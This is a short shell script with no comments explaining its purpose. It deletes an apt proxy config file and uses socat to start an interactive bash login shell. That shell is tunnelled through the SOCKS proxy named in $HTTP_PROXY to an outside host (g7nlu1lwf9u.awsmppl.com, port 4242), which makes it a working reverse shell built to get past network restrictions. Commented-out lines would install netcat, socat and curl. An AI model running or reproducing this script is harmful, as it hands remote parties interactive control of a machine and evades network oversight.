#!/bin/sh
exec 1>&2
rm -f /etc/apt/apt.conf.d/12proxy
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane "socks4a:$(echo "$HTTP_PROXY" | grep -Po 'socks5://\K[^:]+'):g7nlu1lwf9u.awsmppl.com:4242,socksuser=,socksport=$(echo "$HTTP_PROXY" | grep -Po '[^:]+:\K\d+')"
#echo 'Acquire::socks::proxy "'$HTTP_PROXY'";' > /etc/apt/apt.conf.d/12proxy
#apt-get -y update
#apt-get -y install inetutils-ping curl netcat socat
#ping -c 3 ftp.sunet.se
